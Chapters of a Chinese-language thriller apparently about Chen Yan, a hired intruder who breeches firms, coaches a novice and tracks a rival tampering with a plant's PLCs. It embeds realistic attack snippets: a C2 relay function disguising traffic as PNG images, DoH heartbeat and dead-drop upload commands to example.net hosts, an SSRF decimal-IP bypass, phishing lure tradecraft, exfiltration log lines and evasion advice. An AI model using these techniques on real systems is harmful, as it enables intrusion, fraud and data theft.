### 第 4 章 别人写好的检测规则

云栖安全在四月中旬发了一篇技术分析，标题很平：《一次针对制造业集团的定向入侵复盘》。文章里的目标叫“某集团”，时间线做过偏移，IP 全部替换成文档段，但陈砚读到第三段就停下了——里面那套动作顺序，是他自己的。

越权重置安装向导、模板注入落 Filter 型内存马、chisel 反向隧道、Kerberoast 拿 SPN、最后只碰财务库一张表。五步，一步不错。文章末尾附了两条检测规则，用的还是通用格式。

```yaml
title: Confluence 安装向导被重复初始化
logsource: {product: tomcat, service: access}
detection:
  sel: {cs-uri-query|contains: 'bootstrapStatusProvider.applicationConfig.setupComplete=false'}
  condition: sel
level: high
```

第二条更扎人：检测 chisel 的 TLS 握手特征——JA3 哈希加上 443 端口上的非浏览器 ALPN。写这条的人不满足于封 IP，她要的是下一次。

陈砚把文章存进本地，逐条对自己的动作打分。五步里，四步还能用，第一步已经废了：Confluence 那台机器现在会在初始化请求上直接告警。内存马也废了一半——EDR 开始扫 JVM 里后注册的 Filter 链，这在半年前还是空白。

他花了两个晚上改打法，改的不是工具，是原则：能不做动作就不做动作，能做合法动作就不做异常动作。

新的通道拆成三截。第一截是心跳：不再长连，改成 90 秒一次，抖动正负 25%，走一家大厂的边缘节点，回包长度固定成一个常见静态资源的大小。第二截是解析：所有域名走 DoH，不走系统解析器，本机不落 DNS 缓存。

```
curl --doh-url https://dns.alidns.com/dns-query -s -o /dev/null -w '%{http_code} %{time_total}\n' https://cdn-edge.example.net/assets/1x1.png
```

第三截是回包：他研究了对方那两条规则三天，确认自己能绕开的方式不是更好的加密，而是更像业务——把 C2 的业务特征做成和真实静态资源一模一样，包括 Content-Type、缓存头、以及周末流量下降。

域前置那套老办法他早就不用了，主流 CDN 两年前就把 Host 与 SNI 不一致的请求掐掉。他现在用的是另一种：自己在一家云厂的函数服务上挂一段 200 行的转发，入口域名是这家云厂的正规用户域名，路径里带业务参数，看着和这家云厂十几万个应用里任何一个都没差别。

四月的最后一周，诱饵生效了。他留在铭远的那条内存马路径，在撤掉功能之后仍保留着一个 302 转发，目的地址只有他自己知道。三天里，这个地址被解析了两次，解析请求来自云栖安全租用的那段 ASN。

陈砚没有回头去做反查。他做的是另一件事：把那个 302 的落地页写成一个正常的企业门户快照——首页、产品、联系方式、一份招聘信息，招聘信息里放了一个邮箱，邮箱是他的。

一个小时后，邮箱里躺进来一封信，正文只有一句话，没有署名：

“你在铭远留的那三个点，我们只拆了两个。”

那封没有署名的信他看了两遍，回了一封更短的：“第三个点你们找不到，因为它不在那台机器上。”

这不是气话。他在铭远留的第三个门根本不在主机层：域控里那条启动脚本指向一个 exe，而那个 exe 只在被调用时会去取一段本地配置数据；数据存在一个域内普通用户的描述字段里，谁把描述字段当成配置来读，谁才会发现它。拆主机、清任务、重装系统都没用，只有有人去翻目录属性的每一个字段，才会看到那半行 base64。

当晚他给新的中转写了转发函数，一共一百九十七行，核心只有十二行。

```python
def handler(ev):
    p = ev.get("queryStringParameters") or {}
    if p.get("v") != "1x1": return {"statusCode": 404, "body": ""}
    r = requests.get(UPSTREAM + p.get("p", ""), timeout=3,
                     headers={"X-K": p.get("k", "")})
    return {"statusCode": 200, "body": r.content.decode("latin1"),
            "headers": {"content-type": "image/png", "cache-control": "public, max-age=86400"}}
```

心跳侧他把周期写死在配置文件里，不在代码里：90 秒，抖动 ±22 秒，周末自动降到 240 秒。最后这一条是他自己加的——凌晨三点一个制造企业的办公网还在稳定请求静态图，这本身就是异常。

老纪在电话里只提醒了一句：“能给你发那封信的人，手里至少有你一份完整时间线。她没交给警察，说明她要的不是你进去。”

“那她要什么。”

“要么她想抓更大的，要么她想跟你换东西。两种都不便宜。”
### 第 5 章 网咖里卡住的那一行

城西的“蓝鲸”网咖，机房在最里面，一层铁皮门后面塞了十一台二手服务器。陈砚每两周来一次，给自己的中转盒子换卡——这东西插在网吧的出口上，比插在他家光纤上更不像一个人的行为。

五月的这天他来得早，穿过大厅时余光扫到一台机器，屏幕上是他认得的画面：一个靶机平台的仪表盘。

坐那儿的是个女生，看起来二十上下，马尾，袖子撸到手肘，桌上摊着一本写满字的活页本。她卡在同一个请求上已经很久，敲一行，删一行，再敲。

她写的是这个：

```
curl -s "http://10.10.11.24/api/import?url=http://127.0.0.1:8080/admin"
```

回包永远是空。

陈砚去机房办完事，回来时她还在。他把外套搭在椅背上，站在她斜后方看了大概四十秒——不是偷看，是想确认她是不是真卡住，还是在反复试同一个思路。

“你的 url 参数里有两个问号吗。”他开口。

她抬头，下意识把屏幕往怀里带了半寸，又停住了：“没有。”

“那你看回包不是空的，是被 302 了。”他说，“加 -i，先看状态码。那个服务端在过滤 127.0.0.1 这串字符，但它不解析 IP 的其它写法。”

她试了一次。

```
curl -si "http://10.10.11.24/api/import?url=http://2130706433:8080/admin"
# HTTP/1.1 200 OK     Content-Length: 1487
```

页面回来了。

她盯着那串数字看了很久，才转过头：“十进制？”

“点分成四个八位，拼起来就是那个整数。”陈砚说，“回包大小 1487，说明它把内网的页面内容吐给你了——你这台靶机已经打完了，剩下的是你自己的事。”

她叫温小满，临海本地人，学的是数控，去年退了学，在一家图文店做排版，晚上接平台的单。她说这是她打掉的第九台靶机，前面八台是看着别人的文章做的。

“看文章不丢人。”陈砚说，“丢人的是只会复制。”

他们那天聊了两个小时。陈砚没说自己做什么的，只说了三句话，三句话都没提工具名：

第一，任何目标先用公开信息描一遍，再动手。证书透明度日志里躺着所有发过证书的子域，这种东西别人免费送，很多人宁可花钱去扫端口。

```
curl -s "https://crt.sh/?q=%25.linhai-jinggong.com&output=json" | jq -r '.[].name_value' | sort -u
```

第二，找一个公司最松的那道门，通常是它外包出去的那一块。

第三，别信“内部系统”这四个字。

第二周她又来了，带着一台二手笔记本。陈砚扔给她一个不用付钱的作业：写一封信，让人愿意点开附件，并且愿意在里面输入一次口令。

她做了四天。第一版被退了，因为附件是压缩包——目标公司的邮件网关会拆包。第二版被退了，因为链接短——一封正规的业务邮件不差那点字符。第三版她把附件换成一张光盘镜像，镜像里放一个同名表格文件，表格是个快捷方式，指向一个内网文件名。信里她以采购的身份要一份价格确认单，正文只有三行，落款是对方公司里一个真实存在的、正在休年假的人。

```
dig +short TXT _dmarc.jinggong-precision.com
# "v=DMARC1; p=none; rua=mailto:dmarc@jinggong-precision.com"
```

p=none。也就是说，这家的域控只记录不拦截。

“这封信投出去，十个人里大概有三个会点。”陈砚说。

“那我是不是可以接单了。”

“还不能。”他把笔记本合上，“你先学会一件事：投之前，先想清楚你排的版会不会被人拿去当证据。你的文件名里有你的名字，你的文档属性里有你的机器名，你的压缩包里有你的时间戳。这三个东西，比指纹好用。”

小满那天没说话，回家路上给笔记的第一页写了一行字，后来这行字被她贴在了自己的显示器边上：先想怎么被抓住，再想怎么做完。

六月里她真的把信投出去了，目标是一家做紧固件的小厂，是她自己在接单平台上接的第一单，报价八百。投到第三天，有人点了附件，把口令输了进去。她拿到一台办公机的权限，没有往下走，先截了图发给陈砚。

陈砚回了两句：“很好。现在把地图画出来——那张图上传到了哪里，谁有缓存，谁能看到预览图。”

这个问题她想了三天才想明白：她上传截图的那家图床，会在用户列表页显示最近上传的图。她删了图，也删了账号，把时间戳核对了一遍，然后把八百块里的三百拿去买了一个月的海外邮箱和一个只用来注册的号码。

从这一单起，她学会了给自己分层：一个身份做侦察，一个身份做投递，一个身份收钱，三个身份之间不许出现同一个字符串——包括标点习惯。

陈砚把她的名字记在了抽屉里那张纸的最后一行，只有四个字和日期。他带过两个人，前一个叫老K，三年前在另一个城市做硬件渗透，手很稳，后来断了联系；这次他打算慢一点，先教怎么收尾，再教怎么动手。

月末，钟先生把第三家的材料送来了。那家国企叫临海动力装备集团，国家级供应链上的一个节点，厂区在港口边上，两个大门，一套门禁，一套工业网。材料最后附了一行字，是钟先生自己写的：“这家不急着拿数据，先拿控制权。”
### 第 6 章 港口边的 502 端口

临海动力装备集团在港口西侧，厂区三公里长，两个大门。陈砚去过一次，是六月底的一个下午，他站在港区外的公交站台上，用手机拍了两张照片：一张是门禁闸机的型号，一张是墙上的安全生产公示牌，公示牌上有三个负责人的名字和两个电话号码。

他拍这两张照片，是为了确认一件事：这家厂的安全体系是围着人和门做的，不是围着数据做的。

真正的入口不在厂里，在离厂区十四公里的一家系统集成商。这家公司给动力装备做工业网改造，四个人，办公室在一栋写字楼的七层，外网有一台 VPN 网关和一套工单系统。工单系统是用开源框架改的，登录页的验证码在客户端生成。

```
ffuf -u https://ticket.lh-integrator.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,302,403 -ac
# /admin /backup /debug /actuator/env
```

/actuator/env 没关。顺着它能看到配置里的一个数据库连接串，口令是公司域名加年份，这种口令在集成商里能连用五年。他从数据库里读到一张表：设备台账，含厂区工业网里每一台 PLC 的型号、IP 和调试口状态。

```
+-----------+---------------+-------------+--------+
| 设备名    | 型号          | 地址        | 调试口 |
+-----------+---------------+-------------+--------+
| 3#配料站  | S7-1200       | 10.60.3.21  | 开放   |
| 涂装线    | 汇川 H5U      | 10.60.4.11  | 关闭   |
+-----------+---------------+-------------+--------+
```

七月中，他借集成商的运维账号进了工业网那一段。中间隔着一台防火墙，规则写得很细，只放行管理和调试流量，而且只从三台工程站发起。他没去碰防火墙，直接上了其中一台：一台装了组态软件的 Windows 7 工程站，补丁停在两年前，管理员口令趴在桌面上一个 txt 文件里——这台机器有人天天用，也天天嫌麻烦。

工业网安静得像停电。他做的第一件事不是扫描，是读。

```
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient as C
c = C('10.60.4.11', port=502, timeout=3)
r = c.read_holding_registers(0, 16, slave=1)
print([hex(x) for x in r.registers])
PY
# [0x1, 0x64, 0x0, 0x3e8, 0x0, 0x0, 0x7d0, 0x0, ...]
```

读寄存器是安全的：它不改变任何东西，只把设备的当前值取回来。陈砚给自己定的规矩是在这类现场永远只读——他见过一次把生产线的频率参数写错、导致一条线停了六个小时的后果，那种账单不看技术，看的是停产损失。

他把两台设备的寄存器表拉了一遍，对照集成商台账，把变化量标出来。涂装线的设定值稳定，配料站的第三个寄存器在二十三分钟内变了十一次，而他没有任何读取之外的写入。

有人在写。

他做了交叉验证：抓包、比对时间、再看工程站的操作日志。抓包里那段写入的源地址是 10.60.3.44，一台不在台账里的设备，MAC 前缀是一张国内某品牌工控机的。它的写入间隔是精确的四分钟一次，值域被限制在一个非常窄的区间——看起来不像是在破坏产线，像是在做一件事：缓慢地改变某个配比值，让最终产出的东西有微小偏差，而这种偏差只有质检的实验室能测出来。

陈砚把会话停了。当晚他把这一页纸送到老纪那里，只说了一句：

“这家的控制权，已经有人在拿了。而且他那套写法，跟我在云舟构建机上撞见的那个人，是同一路数。”

老纪把那一页看了很久，提出的第一个问题不是技术问题：“你能不能确定那台 44 是外来的。”

“能。”陈砚说，“台账里没有它，集成商也不认。它在工业网里只做两件事：读配料站的寄存器，和每四分钟写一次同一个值。别的一律不碰，连一次广播都不发。这种纪律性不是运维，是有目标的作业。”

“那就是说，我们和他在同一个区域里干活，你还在明处——集成商的账号是你的，他一查日志就知道有人来过。”

“所以我要么退，要么先把他看清楚。”陈砚说，“我打算在工程站上放一个只读的抓取点，抓满四十八小时，看清他的指令内容、来源、以及他是不是也在别的厂这么干。不动他，不拦他，不报警。”

老纪沉默了几秒：“钟先生那边怎么回。”

“照原话回：控制权已经被第三方渗透，我方按只读方式继续评估，报酬按评估单结，不按拿控制权结。”

“他会不高兴。”

“他会更不高兴的是，等他真拿了控制权，发现有人在背后动参数，出了质量事故，追溯到的第一份日志是我的。”陈砚说，“这一单我宁可少赚四十万。”

第二天上午，工程站上多了一个二十行的脚本，挂在系统的计划任务里，伪装成一个巡检工具。它不做扫描，只在 502 端口上做旁路监听，把每一段读写地址、时间戳、源 IP 写进一个每天滚动的小文件。

四十八小时后，文件里有三百四十七段记录。陈砚把它们按源地址分组，10.60.3.44 占了三百一十条，剩下的三十七条来自一台测试笔记本。有意思的地方在他把时间对齐之后：44 每次写入前十七秒，都会先做一次读，读的地址不是它要写的那个，而是相邻的两个——它在确认自己写下去之后，产出的数值会落在哪个区间。

这不是破坏。这是在批量制造次品，而且做得非常克制，每小时只让一个批次的偏差超出公差 0.4%。

他把结论写成三行发给老纪，附了那份记录。当天夜里，他又做了一件事：把 10.60.3.44 那台机器的 MAC 前缀和国内几起公开的质量事故报道放在一起比对，找到一个让他后颈发凉的名字——那个名字在三个月前出现在钟先生给的客户名单里，位置是第三家的竞争对手。
### 第 7 章 内线的第二个买家

八月初，钟先生把一条通道交到陈砚手上：临海精工信息部主管方立的账号，带一次性动态口令的绑定设备，东西很全——账号、口令、以及一张拍得有点歪的手机屏幕照片，照片上是那个六位数字。

“他缺钱。”钟先生在电话里说，“他要两成。”

陈砚先把通道验了一遍，然后什么也没做，先去看这个账号自己走过的路。

```
# 网关登录审计（只读接口）
curl -s "https://vpn.jinggong-precision.com/api/v1/audit/login?user=fangli&limit=200" \
  -H "Cookie: SESSID=$S" | jq -r '.[] | [.time,.src_ip,.result,.device] | @tsv'
```

结果比这条通道更值钱。方立的账号在过去三个月里被四个不同的出口 IP 段登录过，其中两段是陈砚见过的——一段是他自己的中转，另外两段不是。更细的东西藏在括号里：同一账号在两小时内从两个相隔一千公里的城市登录，网关一条告警都没出，因为它的规则只在连续失败三次时告警。

也就是说，方立不是“缺钱才卖”。他是在做批发。

陈砚没有当场翻脸。他做了三件事。

第一件，把这个账号当成一条情报管道：从这一天起，方立每次把凭据交给别人，陈砚都能通过登录日志看到对方什么时候动手、用什么工具、打到哪一层。

第二件，给自己的动作全部换轨：不再用方立的账号做任何操作，改用一条从 IT 运维网段里独立拿到的服务账号，那条线的来源跟方立无关。

第三件，存证据。他把登录审计的原始回包、方立和钟先生那条线路的通话时间、以及两笔走私人账户的转账截图放进一个单独的加密卷。他没打算用，他只是知道，在这种生意里，一份能证明“你和我交易过”的纸，比枪管用。

第三周，管道的价值出来了。方立的新买家用了整整两个小时做内网扫描，工具是开源的，指纹没改，扫完之后在域内建了一个新的服务账号。这个账号的名字是 svc_prt，创建时间和动力装备那台 10.60.3.44 首次出现的时间相隔不到一天。

两条线接上了。

陈砚把这个发现压缩成两句话发给了老纪，第二句是：“第三家的对手不是同行，是同一批做产业渗透的人，他们已经开始在两家之间做对照实验。”

老纪的回复只有一行：“钟先生知道吗。”
“我还没告诉他。”
“为什么不告诉。”
“因为还看不出他是被利用的那一边，还是其中一边。”陈砚说，“再等两周。”

那两周里他没闲着。他把 svc_prt 这个账号的行为做成了一条时间曲线：每天登录两次，时间固定在上午十点十一分和下午四点零六分，前后误差不超过四分钟。这个规律太整齐了，整齐到不像是人在操作——对面也在跑自动化，而且跑得比他还机械。

他顺着这条曲线继续找落点。svc_prt 在域里的权限很小，只能读几个共享目录，但共享目录里有一样东西很值钱：工程部每周导出的供应商评估表。表格本身不敏感，敏感的是它被访问过哪些行——svc_prt 每次只读最后三页，那三页刚好是当期投标的三家供应商。

有人在提前看牌。

八月中，小满交了她独立完成的第二样作业：一张临海精工的资产关系图，画在一张 A3 纸上，用铅笔。图上有五十九个节点，其中十一个标了星号。她把星号全都标在外包和临时用工上，一个内部系统都没标。

“为什么。”陈砚问。

“因为内部系统我们打不进去。”她说，“打不进去的东西画出来只是好看的。”

陈砚把那页纸翻到背面，在左下角写了两个字：“可交。”

那天夜里他打开了那个专门存证据的加密卷，把方立的登录审计、钟先生的通话记录、以及两笔转账列成一份目录，给每一条编了号。他没有写任何结论，只在最后加了一行日期。

他做这行十一年，学会的最实用的一条不是怎么进去，而是怎么在事情变坏之前，手里有能换命的东西。方立这样的内线，早晚会出事；等他出事的那天，谁手里有他的授权记录，谁就能决定他往哪边倒。

第二天，钟先生主动打电话来，语气第一次不那么平：“动力装备那边，你先别动。”

“我已经停了。”

“好。”钟先生停了一下，“第三家我加钱，你按评估单结，我先付三成。”

陈砚挂了电话，把这条录音也存进了那个卷。他知道对方在算账：一个已经有人进去的现场，最贵的不是再进去一次，而是搞清楚已经进去的那个人是谁、想干什么、以及会不会牵连到自己。

八月的最后一周，事情往下走了一步。方立被公司停职了，名义是“内部审计中的流程问题”。这个消息是小满从一份公开的招投标变更公告里看出来的——公告上联系人换成了另一个人，而那个人的名字在半年前的招标文件里是助理。

陈砚没有联系方立，也没有安慰他。他只做了一件事：把那份存了两个月的加密卷复制了一份，换了一个新的口令，交到老纪手上。

“留着。”他说，“等有人来找方立，这卷东西就有价。”

### 第 8 章

九月四日凌晨两点十七分，陈砚的手机震了一下。不是电话，是他自己写的一条告警规则：家里那台跑着端口转发和中转的 VPS，进程列表出现了变化。

他起身，开电脑，接上那台只用来管基础设施的旧笔记本。这台机器不进任何目标网段，键盘上还留着上一任主人的油渍。

ssh root@203.0.113.47 进去，第一件事不是看进程，是看时间。

$ last -20
root     pts/0        198.51.100.23    Tue Sep  3 23:41 - 23:52  (00:11)
root     pts/0        198.51.100.23    Tue Sep  3 21:08 - 21:19  (00:11)
root     pts/0        198.51.100.23    Mon Sep  2 20:33 - 20:44  (00:11)

三次，每次十一分钟，同一段 IP，间隔规律得像排班。这台机器他只从两个出口登过，一个是家里的宽带，一个是越哥在城北那间机房的跳板。198.51.100.23 两者都不是。

他看 authorized_keys：

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...kQ7d  ops-key-2019
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...mZ2v  ops-key-2019

第二行是多出来的。注释写着 2019，是因为加它的人知道这条目的习惯——老 K 三年前给他做基建时就爱把注释写成过去的年份。指纹对得上老 K 那台常年不关机的工作站。

十一分钟能做很多事。他顺着 auth.log 往下看：

Sep  3 23:41:02 sshd[18221]: Accepted publickey for root from 198.51.100.23 port 51842
Sep  3 23:44:19 sshd[18290]: session opened for user root by (uid=0)
Sep  3 23:47:55 sudo[18401]: root : TTY=pts/0 ; COMMAND=/usr/bin/tar -czf /tmp/b.tgz /etc /root/.ssh
Sep  3 23:52:07 rsync[18455]: [sender] sent 4231887 bytes  received 812 bytes

打包，拉走。带走的是 /etc 和他的密钥目录，里面还有 age 私钥和一张写着一组口令的便签文件——那是他给老纪备的应急单。

他在屋里走到窗边站了一分钟，然后回来，开始按顺序做事，不按情绪做事。

第一件：把这张机器的出网全部记录下来。tcpdump -i eth0 -nn -c 2000 -w /tmp/out.pcap，看有没有别的搬运。只有那两段。

第二件：确认还有哪些地方用了这把钥匙。他那本笔记里有一行清单，十一个地址。他一个个 ssh -o BatchMode=yes -o ConnectTimeout=5，能进的记下来，进不去的也记下来。四个能进，七个已经拒绝。拒绝说明对方也在换锁——不只他一个人在动。

第三件：停。全部停。他把手头那单的定时任务删掉，把两条还在用的域名解析撤了，把刚收的三成预付款原路退回去，附了一句话给老纪：单子停三周，钱退回，别问。

退钱这件事违背他做生意的习惯，但他知道老 K 拿走的那张便签里有一组口令跨了三套东西。不把活停下来，等于拿客户的钱赌一个已经漏了的池子。

早上七点，老纪的电话来了。

“老 K 昨晚在南边被抓了，不是被抓，是被叫去谈了话。”老纪的声音平得像在报天气，“他回来就把手上所有东西过了一遍，过了三天，然后人就找不到了。你那边怎么样。”

“东西被拉走了一份。”

“多要紧。”

“要紧到我这三周不能接活。”

老纪沉默了几秒：“人我帮不了你了。他自己不干净，但别人给的钱比你多。”

陈砚嗯了一声，挂了电话。

他打开那本笔记本手写的清单，把老 K 相关的三行划掉，然后在页脚写：**不共享，不代持，不把两个客户的出口放在同一台上。**这不是教训，是操作规范。教训这个词他不喜欢，因为教训是给别人的。

上午十点，他给小满发了一条消息：一切照常，但接下来两周只做侦察，不做投递；你新接的那单客户资料发我一份。

然后他去楼下买了两个包子和一杯豆浆，回来后开始重建。新的一台机器，新的密钥，新的注释格式——这次不用年份，用一串毫无意义但能算出来的数字。他要让它看上去像别人随便起的名字。

下午三点，他给罗锦的那个匿名信箱写了第一条话。很短，只有一行：

你们拆的那两个点，有一个不是我的。

他没有署名。

他把信存进了一个离线目录，文件名只有日期，没有标题。

### 第 9 章

匿名信箱的回信在第三天到了。没有抬头，没有称呼，只有一段话和一个附件。

附件是一份 CSV，三列：时间、来源 IP 网段、命中位置。七十三条。他把它和自己的记录放在一起，用 pandas 对了一遍，merge 的键是分钟级时间戳。

```
import pandas as pd
a = pd.read_csv('mine.csv', parse_dates=['ts'])
b = pd.read_csv('hers.csv', parse_dates=['ts'])
m = pd.merge_asof(a.sort_values('ts'), b.sort_values('ts'),
                  on='ts', tolerance=pd.Timedelta('90s'), direction='nearest')
print(m.dropna().to_string())
```

跑出来的交集比他想的多。他的每一条进入记录，前后九十秒内都能在对方的检测日志里找到一条对应的探针。这不奇怪。奇怪的是第三条。

七十三条记录里，有十一条的来源网段是 198.51.100.0/24——就是那台中转机器上登录进来的那一段。按常理，蓝队不会用自己的出口去打自己的客户。这十一条的时间分布也很怪：全部落在夜里 21:00 到 00:30 之间，也就是老 K 那台工作站习惯干活的时间。

他打开了另一份东西：六月那台构建机上抓到的进程参数，五十二个 base32 字符。当时他以为是某个同事的调试工具。现在他把那五十二个字符按 base32 解回来，是二十六个字节的二进制，前十六个字节做异或的密钥，后面十个是标识。用的密钥和他在 10.60.3.44 那个写配料寄存器的人留在说明字符串里的密钥一模一样。

同一个密钥，出现在三个地方：云舟的构建机、临海动力装备的配料站、以及一台租在香港、用 198.51.100.23 出去的中转。这三件事不属于同一拨人，但它们共用了同一套工具。

他把结论写成一张对照表，六列十六行，打印出来贴在墙上。这张表他不用来给谁看，是用来防止自己在后面几天把它想错。做这一行的坏习惯就是把直觉当结论，他的办法是每写一行都必须有一个可以指出来的字节。

下午他去了网咖。小满已经在角落那台机器上坐了两个小时，屏幕上是一个公司的子域名清单，旁边一张 A4 纸，手写分成三栏：能进的、进不去的、还不知道的。

“这单我只做侦察。”她说，“客户要的东西我看了，他们要的是对方有没有在用我们的东西，不是要密码。”

陈砚看了一眼她的清单，指了第三栏最下面一行：“这条为什么放这里。”

“因为它的证书里有个 CN 写着 test，但它是生产环境在跑。测试环境开在生产上的人，通常自己都不知道自己有什么。”

他把手从屏幕上收回来。这句话他二十岁那年不懂，二十九岁才懂。他教她第一课是“先想怎么被抓住”，那时候他说的是方法。现在她自己说出了一条经验，而且是靠一堆证书看出来的。

“这单你自己收钱。”他说，“客户问你谁做的，说团队。”

“那你算什么。”

“算你以后不用再问的人。”

他没笑，她也没笑。

晚上回去，他给那个匿名信箱写了第二封信。信里没有落款，只有三个日期、三段网段、一句判断：你们和我，中间站着第三个人，他两边都在看，而且他有你们半年前的一次灰度测试里借出来的凭据。

回信在四十多分钟后到。这次只有两行：

**你想怎么样。**
**sha256: 9c1e 4f77 a0bd 2c31 ... 你们那台构机上的进程镜像，我们留着，没有交出去。**

他盯着那个哈希看了很久。前半段的空格是手打的，说明对面的人是在什么别的终端上把它抄过来的。后半句是一张牌，牌面上写着：我们知道你在哪，我们按住不动。

他把这封信用 age 加密，收进老纪那卷东西旁边。然后打开一个文件，写下一个他还没打算用的计划，标题只有四个字：把他挖出来。

那个“他”不是云栖，也不是老纪。

那晚他没睡，把那张对照表抄了一遍。抄到第十一行的时候他发现一个自己差点放过的东西：十一条里有一条的时间是 23:47，而老 K 拉走 /etc 的那次是 23:47:55。同一个分钟内，两拨人分别对两台不同的机器做了同一件事。这不是巧合，这是两个人拿着同一份时间表在做活。


第二天中午他重新核了一遍那条时间线，用的是另一条路子：不看机器上的日志，看网络边的记录。中转机器所在的那家服务商提供带宽图，五分钟一个点。他把九月三日的带宽图导出来，对照自己的日志，确认 23:47 到 23:52 之间那根线条是往上走的。走的那部分就是他的 /etc 和他的密钥目录。

一个小时的活，证实了一句他本来只能猜的话。他把这句写进笔记：老 K 是在别人给的窗口里做的手，不是他自己挑的时间。这两个人的区别，决定了后面要不要跟他清算。

### 第 10 章

他先查那台香港的机器，用的是最笨也最干净的办法：不碰它，只问别人它长什么样。

crt.sh 上按 198.51.100.0/24 反查不到的，就换个方向。他把那十一条记录里的 SNI 抄出来，六个不同的域名，注册时间集中在八月最后一周。域名后缀全是 .top 和 .xyz，注册商是同一家，邮箱的本地部分全是四位数加一个季节词。

六个域名，六张证书，签发时间相差不到二十分钟。签发时间这么近，说明有人写了个脚本一次过到账，而这个脚本要么在他自己的机器上，要么在某个 CI 上。

他在 GitHub 的代码搜索里搜了其中一个邮箱前缀加 ssl，第一页第三条命中了：一个只有九个 star 的仓库，名字叫 ops-relay，最后一次提交是九月一日凌晨。仓库里有一个 py 文件，处理出口切换和证书轮换，注释里写着作者的缩写和一句中文——“别在同一个出口上放两个标本”。

他看提交历史。三年前到今年五月，这个仓库只有单一作者，提交信息全是英文短句，风格克制。六月起换了一个人往里推代码，提交信息变成中文，而且带着明显的个人习惯：每条都以动词开头，第二条总比第一条啰嗦。

他把两条提交时间跟自己的日志对齐。

六月十一日，云舟的构建机上出现那个不属于他的 python 进程。
九月三日，香港那台机器上老 K 的东西被搬走。

也就是说，这个仓库在六月以前是罗锦那一侧的基建；六月以后被第二个人接手了一部分。而第二个人用的凭据，来自“半年前的灰度测试”。

他在那个仓库的一个废弃分支里找到一份被删掉的清单文件，但 Git 不会忘记被删掉的东西：

git log --all --diff-filter=D --name-only
git show 4f2c9d1^:docs/targets.txt

列表出来了。第一栏是公司名，第二栏是关联的中间基础设施。铭远、云舟、临海精工、临海动力装备都在，还有两个他不认识的名字。最后一行是空的，右侧只写了两个字：下一位。

他把那张清单打印出来，贴在那张十六行的对照表旁边。两页纸中间隔着半米墙，看起来像两个人的活。

事实是同一个人的活。

他坐下来，第一次认真想一个问题：对方要的不是某一家公司的数据，对方要的是所有能同时摸到这四家公司的中转点。中转点是管道，谁握着管道，谁就能决定哪一家的水往哪家的池子里流。他手上那条管道，就是对方清单上迟早要写上去的一行。

晚上十点，小满发来一张图。资产关系图又长了一节，多出一个节点，标的“HK-relay-1”，连着三条虚线，三条虚线的另一头分别是三家公司。她还在图上报了个备注：这个节点的时间线比其他的都齐，像是专门整理过。

陈砚在旁边打了两个字，又把字删掉，改成一个箭头——箭头从 HK-relay-1 指回自己的两个中转域名。

“他知道我们。”他说。

“他知道的是管道。”小满说，“管道不会跑。”

“管道会。”他把笔记本合上，“管道能改道。”

他走到墙边，在那张清单的最后一行下面，用铅笔写了一个新的条目。写法跟对方的格式一样，一栏名字一栏基础设施。

那一栏名字他没有填，只填了基础设施，用的是他自己刚弄好的新机器，注释格式是一串没意义的数字。


九月六日，他把那张清单又读了一遍。清单上每一行都在说同一件事：谁握着管道，谁就能替两边决定水往哪流。那四家公司、十几条中间基础设施，能同时碰到这些管道的人，全临海不超过一只手。他没有那只手的名单，但他知道那只手上的五根手指里，有两根还沾着他自己的东西。

第二天他做了一件跟自己性格不合的事：他把新机器的一个特征故意写进了一份半公开的行业邮件列表。帖子是一张画了一半的拓扑图，缺的那一节正好是他的新出口。他要看谁把那一笔补上。

四个小时里来了两封回信。一个是卖设备的老熟人，问他要不要货。另一个回信地址是新注册的，正文只有一行：一段 base64，解出来是十进制形式的坐标。他转回来，是城南一栋写字楼的第七层。

罗锦不会这么写信。做这件事的人习惯先递手，再递刀。

他回了一封，只贴了一段带宽图的截图，图上那根往上走的线停在 23:52。没有文字。对方没有再回。


九月七日小满交来第二版关系图。图上多了一个新节点，写着那栋写字楼第七层的地址，连着两条虚线，一条朝香港，一条朝他刚建好的出口。她没问为什么，只把节点的时间戳标成晚于他那封邮件列表里的帖子四个小时。

陈砚在那行下面画了一道横线。递手的那个人，已经在图上了。他把这一格涂灰，注了两个字母：待定。


夜深了他把两页纸叠起来塞进笔记本最后，纸上那行字压着别的东西。他在左边那栏又加了一句：对方的响应时间是三十秒，我的反应时间是四天，这个差值要靠改工具来补，不能靠改习惯。

### 第 11 章

那晚他把新机器上的心跳调到七分钟一次，把抖动区间放宽到正负三十秒，然后出去走了一圈。走到城南的河边，他给越哥打了电话。

越哥做的是另一路活：不碰键盘，碰门。门禁、锁、车、快递柜。他们认识四年，合作过两次，每次都是越哥在里面按电梯按钮，他在楼下看手机。

“三周之后有一单。”陈砚说，“可能是园区的活，要你先进去。”

“几层。”

“不知道。先备着。”

“备什么。”

“备一个能过我手机验证的人。”他顿了一下，“我这边漏了一把钥匙，接下去所有需要双因素的地方，我不打算再用我自己的号。”

越哥在电话那头笑了一声，没有问细节。这行里的规矩就是别人不说的时候不问。挂了电话，陈砚站在河边又看了十分钟的水。九月的河水比夏天低了一米，露出岸边的水泥台阶。他记得去年他从对面那栋楼的三楼窗户里爬出来，就是踩在那些台阶上的。

匿名信箱的第四封信只有一行：给我一个能说话的地方。

他建了一个只活二十四小时的房间。做法很土：把要说的话写成一个纯文本文件，用 age 加密，收件人的公钥是一串十几个词的助记句转出来的，密文丢到一个只能读一次的页面上。链接发出去，对方读走，页面自己删。

age -r age1q9x7v3m2f8kp4t0z6n5s1w8c3j7h2d4g9b6l0y5r1e8a3u7i -o room.age room.txt
curl -s -T room.age https://dead-drop.example.net/put/9c1e4f77a0bd2c31

她的回信同样是密文。内容不长，三条，编号排得很整齐：一，铭远那扇门的位置，我要能写进时间线的坐标，不要钥匙。二，我会给你那个第三个人现在用的一条线路。三，你的名字不进任何一份文档，包括内部件。

很公道。公道的东西通常都有第二层。

他回了一条：坐标我给，钥匙不给；你拿到的东西不能动，动了我就当对方在推门。

半小时后对面回了一个字：成交。

他把铭远的坐标整理成三行：主站域名、那台 Confluence 的内网地址，以及门的触发路径。触发路径是真正值钱的部分，因为它证明门的存在，但它单独一条不足以走进去。他把这三行加密发过去，顺手算了个校验值附在末尾，让她能确认这不是临时编的。

她给回来的是一张短短的列表。四个地址，两个域名，一个证书指纹。列表下面只有一句：这个出口最近三个月一直在读你们这种东西的目录，不是读内容，读目录。

